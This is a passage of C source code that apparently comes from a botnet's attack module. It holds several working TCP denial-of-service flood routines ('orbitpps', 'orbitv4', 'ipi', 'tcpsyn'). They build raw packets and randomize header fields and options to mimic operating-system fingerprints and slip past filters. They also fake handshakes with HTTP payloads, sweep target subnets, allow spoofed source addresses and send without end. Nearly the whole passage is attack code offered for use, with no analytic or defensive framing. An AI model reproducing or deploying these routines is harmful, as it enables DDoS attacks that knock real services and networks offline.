                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                port_t src_port = (rand_next() % 60000) + 1024;
                port_t dst_port = (dport == 0xffff) ? ((rand_next() % 60000) + 1024) : dport;
                uint32_t seq = rand_next();
                uint32_t ack = rand_next();
                iph->version = 4;
                iph->ihl = 5;
                {
                    static const uint8_t tos_variants[] = {0x00, 0x10, 0x08, 0x20, 0x28};
                    iph->tos = tos_variants[rand_next() % (sizeof(tos_variants)/sizeof(tos_variants[0]))];
                }
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = htons(rand_next() & 0xFFFF);
                iph->frag_off = htons((rand_next() % 4 == 0) ? 0x0000 : 0x4000);
                iph->ttl = base_ttl + (rand_next() % 64);
                iph->protocol = IPPROTO_TCP;
                iph->check = 0;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;
                tcph->source = htons(src_port);
                tcph->dest = htons(dst_port);
                tcph->seq = htonl(seq);
                tcph->ack_seq = htonl(ack);
                tcph->doff = 5;
                tcph->syn = 0;
                tcph->rst = 0;
                tcph->fin = (rand_next() % 4 == 0) ? 1 : 0;
                tcph->ack = 1;
                tcph->psh = 1;
                tcph->urg = (rand_next() % 8 == 0) ? 1 : 0;
                {
                    static const uint16_t wins[] = {1024, 2048, 4096, 8192, 16384, 32768, 65535};
                    tcph->window = htons(wins[rand_next() % (sizeof(wins)/sizeof(wins[0]))]);
                }
                tcph->check = 0;
                tcph->urg_ptr = tcph->urg ? htons(rand_next() & 0xFFFF) : 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                targs[i].sock_addr.sin_family = AF_INET;
                targs[i].sock_addr.sin_addr.s_addr = target_ip;
                targs[i].sock_addr.sin_port = tcph->dest;
                for (int b = 0; b < burst; b++)
                {
                    iph->id = htons(rand_next() & 0xFFFF);
                    iph->ttl = base_ttl + (rand_next() % 128);
                    switch (rand_next() & 3)
                    {
                        case 0:
                            tcph->fin = 0; tcph->ack = 1; tcph->psh = 1; tcph->urg = 0; break;
                        case 1:
                            tcph->fin = 1; tcph->ack = 1; tcph->psh = 0; tcph->urg = 0; break;
                        case 2:
                            tcph->fin = 0; tcph->ack = 1; tcph->psh = 1; tcph->urg = 1; break;
                        default:
                            tcph->fin = 0; tcph->ack = 1; tcph->psh = 0; tcph->urg = 0; break;
                    }
                    tcph->source = htons(src_port + b);
                    tcph->seq = htonl(seq + b);
                    tcph->ack_seq = htonl(ack + (rand_next() & 0xFF));
                    iph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = 0;
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    if (b < burst - 1)
                        usleep(rand_next() % 201);
                }
                if ((rand_next() & 0x3FF) == 0)
                {
                    int fd = socket(AF_INET, SOCK_STREAM, 0);
                    if (fd >= 0)
                    {
                        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
                        targs[i].sock_addr.sin_port = htons(dst_port);
                        connect(fd, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                        close(fd);
                    }
                }
            }
        }
        if (ratelimit > 0)
        {
            int sleep_us = (int)((double)burst * 1000000.0 / (double)ratelimit);
            if (sleep_us > 0) usleep(sleep_us);
        }
    }
    close(rfd);
}
void attack_tcp_orbitpps(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 128);
    port_t opt_sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t opt_dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint8_t base_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int ratelimit = attack_get_opt_int(opts_len, opts, ATK_OPT_RATELIMIT, 0);
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL use_payload = FALSE;
    if (payload_size > 64)
        payload_size = 64;
    if (payload_size > 0)
        use_payload = TRUE;
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    static const struct orbit_combo combos[] = {
        {0x00, 0x03, 40, 96, 32768, 1}, 
        {0x10, 0x01, 48, 112, 65535, 1}, 
        {0x08, 0x05, 36, 90, 4096, 0},  
        {0x28, 0x0B, 52, 120, 8192, 1}, 
        {0x20, 0x03, 44, 88, 16384, 1},
        {0x00, 0x09, 64, 128, 2048, 0}  
    };
    const int combo_cnt = sizeof(combos) / sizeof(combos[0]);
    uint8_t payload_buf[64];
    if (use_payload)
    {
        for (i = 0; i < payload_size; i++)
            payload_buf[i] = (rand_next() % 94) + 33;
    }
    const int batch_size = 16;
    struct orbit_slot slots[batch_size];
    memset(slots, 0, sizeof(slots));
    BOOL sendmmsg_available = TRUE;
    int slot_idx = 0;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                ipv4_t target_ip;
                struct sockaddr_in target_addr;
                struct orbit_combo combo;
                struct orbit_slot *slot;
                struct iphdr *iph;
                struct tcphdr *tcph;
                uint32_t seq_num = rand_next();
                uint32_t ack_num = rand_next();
                uint8_t ttl_range;
                int pkt_len;
                port_t src_port;
                port_t dst_port;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                target_addr = targs[i].sock_addr;
                target_addr.sin_family = AF_INET;
                target_addr.sin_addr.s_addr = target_ip;
                dst_port = (opt_dport == 0xffff) ? ((rand_next() % 60000) + 1024) : opt_dport;
                src_port = (opt_sport == 0xffff) ? ((rand_next() % 60000) + 1024) : opt_sport;
                target_addr.sin_port = htons(dst_port);
                combo = combos[rand_next() % combo_cnt];
                slot = &slots[slot_idx];
                memset(slot, 0, sizeof(struct orbit_slot));
                iph = (struct iphdr *)slot->buf;
                tcph = (struct tcphdr *)(slot->buf + sizeof(struct iphdr));
                pkt_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
                if (use_payload)
                {
                    payload_buf[rand_next() % payload_size] = (rand_next() % 94) + 33;
                    memcpy(slot->buf + sizeof(struct iphdr) + sizeof(struct tcphdr), payload_buf, payload_size);
                    pkt_len += payload_size;
                }
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = combo.tos;
                iph->tot_len = htons(pkt_len);
                iph->id = htons(rand_next() & 0xFFFF);
                iph->frag_off = htons(combo.df ? 0x4000 : 0x0000);
                ttl_range = (combo.ttl_max > combo.ttl_min) ? (combo.ttl_max - combo.ttl_min) : 0;
                {
                    int ttl_val = combo.ttl_min + (ttl_range > 0 ? (rand_next() % (ttl_range + 1)) : 0);
                    ttl_val += ((int)base_ttl - 64);
                    if (ttl_val < 32)
                        ttl_val = 32;
                    if (ttl_val > 255)
                        ttl_val = 255;
                    iph->ttl = (uint8_t)ttl_val;
                }
                iph->protocol = IPPROTO_TCP;
                iph->check = 0;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;
                tcph->source = htons(src_port);
                tcph->dest = htons(dst_port);
                tcph->seq = htonl(seq_num + (rand_next() & 0xFFFF));
                tcph->ack_seq = (combo.flags & 0x01) ? htonl(ack_num + (rand_next() & 0xFFFF)) : 0;
                tcph->doff = sizeof(struct tcphdr) / 4;
                tcph->syn = 0;
                tcph->rst = 0;
                tcph->psh = (combo.flags & 0x02) ? 1 : (use_payload ? 1 : 0);
                tcph->ack = 1;
                tcph->fin = (combo.flags & 0x04) ? 1 : 0;
                tcph->urg = (combo.flags & 0x08) ? 1 : 0;
                {
                    uint16_t win = combo.window + (rand_next() & 0x1FF);
                    if (win == 0)
                        win = combo.window;
                    tcph->window = htons(win);
                }
                tcph->check = 0;
                tcph->urg_ptr = tcph->urg ? htons(rand_next() & 0xFFFF) : 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(pkt_len - sizeof(struct iphdr)), pkt_len - sizeof(struct iphdr));
                slot->addr = target_addr;
                slot->iov.iov_base = slot->buf;
                slot->iov.iov_len = pkt_len;
                slot->mh.msg_hdr.msg_iov = &slot->iov;
                slot->mh.msg_hdr.msg_iovlen = 1;
                slot->mh.msg_hdr.msg_name = &slot->addr;
                slot->mh.msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
                slot->mh.msg_hdr.msg_control = NULL;
                slot->mh.msg_hdr.msg_controllen = 0;
                slot->mh.msg_hdr.msg_flags = 0;
                slot->mh.msg_len = pkt_len;
                slot_idx++;
                if (slot_idx >= batch_size)
                    orbit_flush_batch(rfd, slots, &slot_idx, &sendmmsg_available, ratelimit);
            }
        }
        if (slot_idx > 0)
            orbit_flush_batch(rfd, slots, &slot_idx, &sendmmsg_available, ratelimit);
    }
    close(rfd);
}
void attack_tcp_orbitv4(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 750);
    port_t opt_dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t opt_sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint8_t base_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int ratelimit = attack_get_opt_int(opts_len, opts, ATK_OPT_RATELIMIT, 0);
    static const uint16_t packet_sizes[] = {64, 96, 128, 256, 512};
    static const uint8_t packet_size_weights[] = {40, 30, 20, 5, 5};
    static const port_t default_ports[] = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000};
    static const uint8_t port_weights[] = {40, 30, 10, 5, 5, 5, 3, 2};
    struct os_profile {
        uint16_t mss;
        uint8_t wscale;
        uint16_t window;
        uint8_t opts_order; 
        uint8_t ip_id_mode; 
    };
    static const struct os_profile profiles[] = {
        {1460, 7, 29200, 0, 0}, 
        {1460, 7, 65535, 1, 1}, 
        {1440, 6, 65535, 2, 0}, 
        {1460, 0, 65535, 3, 0}, 
    };
    const int profile_cnt = sizeof(profiles) / sizeof(profiles[0]);
    static const uint8_t tos_values[] = {0x00, 0x10, 0x08};
    static const uint8_t tos_weights[] = {60, 25, 15};
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    static const char http_get[] = "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n";
    int current_threads = 150;
    time_t last_increase = time(NULL);
    int increase_step = 150;
    static uint16_t incremental_ip_id = 0;
    while (TRUE)
    {
        time_t now = time(NULL);
        if (now != last_increase)
        {
            current_threads += increase_step;
            if (current_threads > threads) current_threads = threads;
            last_increase = now;
        }
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < current_threads; t++)
            {
                ipv4_t target_ip;
                struct sockaddr_in target_addr;
                uint32_t seq_start = rand_next();
                uint32_t ack_seed = rand_next();
                int profile_idx = rand_next() % profile_cnt;
                const struct os_profile *profile = &profiles[profile_idx];
                int tos_rand = rand_next() % 100;
                uint8_t tos_val = 0x00;
                int tos_cum = 0;
                for (int j = 0; j < 3; j++)
                {
                    tos_cum += tos_weights[j];
                    if (tos_rand < tos_cum)
                    {
                        tos_val = tos_values[j];
                        break;
                    }
                }
                uint8_t ttl_val = base_ttl + (rand_next() % 96);
                if (ttl_val < 32) ttl_val = 32;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                target_addr.sin_family = AF_INET;
                target_addr.sin_addr.s_addr = target_ip;
                port_t dst_port;
                if (opt_dport == 0xffff)
                {
                    int port_rand = rand_next() % 100;
                    int port_cum = 0;
                    for (int j = 0; j < 8; j++)
                    {
                        port_cum += port_weights[j];
                        if (port_rand < port_cum)
                        {
                            dst_port = default_ports[j];
                            break;
                        }
                    }
                }
                else
                {
                    dst_port = opt_dport;
                }
                port_t src_port = (opt_sport == 0xffff) ? ((rand_next() % 60000) + 1024) : opt_sport;
                target_addr.sin_port = htons(dst_port);
                int size_rand = rand_next() % 100;
                int size_cum = 0;
                uint16_t packet_size = 64;
                for (int j = 0; j < 5; j++)
                {
                    size_cum += packet_size_weights[j];
                    if (size_rand < size_cum)
                    {
                        packet_size = packet_sizes[j];
                        break;
                    }
                }
                char packet[2048];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                uint8_t *opts_ptr = (uint8_t *)(tcph + 1);
                char *data = (char *)(tcph + 1);
                memset(packet, 0, sizeof(packet));
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = tos_val;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
                iph->id = (profile->ip_id_mode == 0) ? htons(rand_next() & 0xFFFF) : htons(incremental_ip_id++);
                iph->frag_off = htons(0x4000);
                iph->ttl = ttl_val;
                iph->protocol = IPPROTO_TCP;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;
                tcph->source = htons(src_port);
                tcph->dest = htons(dst_port);
                tcph->seq = htonl(seq_start);
                tcph->ack_seq = 0;
                tcph->doff = 10; 
                tcph->syn = 1;
                tcph->ack = 0;
                tcph->rst = 0;
                tcph->fin = 0;
                tcph->psh = 0;
                tcph->urg = 0;
                tcph->window = htons(profile->window);
                tcph->check = 0;
                tcph->urg_ptr = 0;
                if (profile->opts_order == 0) 
                {
                    opts_ptr[0] = 2; opts_ptr[1] = 4; *((uint16_t *)(opts_ptr + 2)) = htons(profile->mss);
                    opts_ptr[4] = 4; opts_ptr[5] = 2; 
                    opts_ptr[6] = 8; opts_ptr[7] = 10;
                    *((uint32_t *)(opts_ptr + 8)) = htonl(rand_next());
                    *((uint32_t *)(opts_ptr + 12)) = 0;
                    opts_ptr[16] = 3; opts_ptr[17] = 3; opts_ptr[18] = profile->wscale;
                    opts_ptr[19] = 1; 
                }
                else if (profile->opts_order == 1) 
                {
                    opts_ptr[0] = 2; opts_ptr[1] = 4; *((uint16_t *)(opts_ptr + 2)) = htons(profile->mss);
                    opts_ptr[4] = 1; 
                    opts_ptr[5] = 3; opts_ptr[6] = 3; opts_ptr[7] = profile->wscale;
                    opts_ptr[8] = 1; opts_ptr[9] = 1; 
                    opts_ptr[10] = 4; opts_ptr[11] = 2; 
                    opts_ptr[12] = 8; opts_ptr[13] = 10;
                    *((uint32_t *)(opts_ptr + 14)) = htonl(rand_next());
                    *((uint32_t *)(opts_ptr + 18)) = 0;
                }
                else if (profile->opts_order == 2) 
                {
                    opts_ptr[0] = 2; opts_ptr[1] = 4; *((uint16_t *)(opts_ptr + 2)) = htons(profile->mss);
                    opts_ptr[4] = 4; opts_ptr[5] = 2; 
                    opts_ptr[6] = 8; opts_ptr[7] = 10;
                    *((uint32_t *)(opts_ptr + 8)) = htonl(rand_next());
                    *((uint32_t *)(opts_ptr + 12)) = 0;
                    opts_ptr[16] = 3; opts_ptr[17] = 3; opts_ptr[18] = profile->wscale;
                    opts_ptr[19] = 1; 
                }
                else 
                {
                    opts_ptr[0] = 2; opts_ptr[1] = 4; *((uint16_t *)(opts_ptr + 2)) = htons(profile->mss);
                    opts_ptr[4] = 3; opts_ptr[5] = 3; opts_ptr[6] = profile->wscale;
                    opts_ptr[7] = 1; opts_ptr[8] = 1; opts_ptr[9] = 1; 
                    tcph->doff = 8; 
                }
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                usleep(rand_next() % 201); 
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
                iph->id = (profile->ip_id_mode == 0) ? htons(rand_next() & 0xFFFF) : htons(incremental_ip_id++);
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->seq = htonl(ack_seed);
                tcph->ack_seq = htonl(seq_start + 1);
                tcph->syn = 1;
                tcph->ack = 1;
                tcph->window = htons(profile->window);
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                usleep(rand_next() % 201); 
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = (profile->ip_id_mode == 0) ? htons(rand_next() & 0xFFFF) : htons(incremental_ip_id++);
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->seq = htonl(seq_start + 1);
                tcph->ack_seq = htonl(ack_seed + 1);
                tcph->doff = 5;
                tcph->syn = 0;
                tcph->ack = 1;
                tcph->window = htons(profile->window);
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                usleep(rand_next() % 201); 
                uint32_t current_seq = seq_start + 1;
                uint32_t current_ack = ack_seed + 1;
                int data_sent = 0;
                int burst_count = 3 + (rand_next() % 5); 
                for (int b = 0; b < burst_count; b++)
                {
                    int current_payload_size = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
                    if (current_payload_size < 0) current_payload_size = 0;
                    if (current_payload_size > 1400) current_payload_size = 1400;
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + current_payload_size);
                    iph->id = (profile->ip_id_mode == 0) ? htons(rand_next() & 0xFFFF) : htons(incremental_ip_id++);
                    iph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->seq = htonl(current_seq);
                    tcph->ack_seq = htonl(current_ack);
                    tcph->doff = 5;
                    tcph->syn = 0;
                    tcph->ack = 1;
                    tcph->psh = 1;
                    tcph->fin = 0;
                    tcph->window = htons(profile->window + (rand_next() % 1024)); 
                    if (current_payload_size > 0)
                    {
                        int http_len = (current_payload_size < strlen(http_get)) ? current_payload_size : strlen(http_get);
                        memcpy(data, http_get, http_len);
                        if (current_payload_size > http_len)
                            memset(data + http_len, (rand_next() % 94) + 33, current_payload_size - http_len);
                    }
                    tcph->check = 0;
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + current_payload_size), sizeof(struct tcphdr) + current_payload_size);
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + current_payload_size, MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                    current_seq += current_payload_size;
                    data_sent += current_payload_size;
                    usleep(rand_next() % 201); 
                }
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = (profile->ip_id_mode == 0) ? htons(rand_next() & 0xFFFF) : htons(incremental_ip_id++);
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->seq = htonl(current_seq);
                tcph->ack_seq = htonl(current_ack);
                tcph->doff = 5;
                tcph->syn = 0;
                tcph->ack = 1;
                tcph->psh = 0;
                tcph->fin = 1;
                tcph->window = htons(profile->window);
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                usleep(rand_next() % 201); 
            }
        }
        if (ratelimit > 0)
        {
            int sleep_us = (int)((double)current_threads * 1000000.0 / (double)ratelimit);
            if (sleep_us > 0) usleep(sleep_us);
        }
        else
        {
            usleep(rand_next() % 201); 
        }
    }
    close(rfd);
}
void attack_tcp_ipi(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 128);
    port_t opt_dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    uint8_t base_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int ratelimit = attack_get_opt_int(opts_len, opts, ATK_OPT_RATELIMIT, 0);
    rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rfd < 0) return;
    int tmp = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
    {
        close(rfd);
        return;
    }
    int sndbuf_size = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf_size, sizeof(sndbuf_size));
    static const char tcp_options[24] = {
        0x02, 0x04, 0x05, 0xb4, 0x04, 0x02, 0x08, 0x0a,
        0x00, 0xd9, 0x68, 0xa3, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x03, 0x03, 0x07, 0xfe, 0x04, 0xf9, 0x89
    };
    int windows[3] = {29200, 64240, 65535};
    int ctos[3] = {0, 40, 72};
    rand_init();
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char datagram[4096];
                struct iphdr *iph = (struct iphdr *)datagram;
                struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
                struct sockaddr_in sin;
                memset(datagram, 0, sizeof(datagram));
                sin.sin_family = AF_INET;
                sin.sin_addr.s_addr = targs[i].addr;
                sin.sin_port = htons(opt_dport);
                iph->ihl = 5;
                iph->version = 4;
                iph->tos = ctos[rand_next() % 3];
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 24);
                iph->id = htons(rand_next() & 0xFFFF);
                iph->frag_off = htons(0x4000);
                iph->ttl = base_ttl + (rand_next() % 30);
                if (iph->ttl > 130) iph->ttl = 130;
                if (iph->ttl < 100) iph->ttl = 100;
                iph->protocol = IPPROTO_TCP;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = targs[i].addr;
                tcph->source = htons(rand_next() & 0xFFFF);
                tcph->dest = htons(opt_dport);
                tcph->seq = htonl(rand_next());
                tcph->ack_seq = 0;
                tcph->res1 = 0;
                tcph->doff = (sizeof(struct tcphdr) + 24) / 4;
                tcph->syn = 1;
                tcph->window = htons(windows[rand_next() % 3]);
                tcph->check = 0;
                tcph->urg_ptr = 0;
                char tcp_opts[24];
                memcpy(tcp_opts, tcp_options, 24);
                tcp_opts[2] = rand_next() % 2 == 0 ? 4 : 5;
                tcp_opts[3] = tcp_opts[2] == 5 ? (rand_next() % 180 + 1) : (rand_next() % 250 + 1);
                tcp_opts[7] = 10;
                tcp_opts[8] = rand_next() % 250 + 1;
                tcp_opts[17] = 3;
                tcp_opts[18] = 3;
                tcp_opts[19] = rand_next() % 4 + 6;
                tcp_opts[20] = 34;
                tcp_opts[22] = rand_next() % 255 + 1;
                tcp_opts[23] = rand_next() % 255 + 1;
                memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), tcp_opts, 24);
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 24), sizeof(struct tcphdr) + 24);
                sendto(rfd, datagram, ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(sin));
                if (ratelimit > 0)
                {
                    int sleep_us = (1000000) / ratelimit;
                    if (sleep_us > 0) usleep(sleep_us);
                }
                else
                {
                    usleep(rand_next() % 100);
                }
            }
        }
    }
    close(rfd);
}
void attack_method_tcpsyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    {
        int sndbuf = 4 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    }
    {
        int sndbuf = 4 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    }
    {
        int sndbuf = 4 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    }
    {
        int sndbuf = 4 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
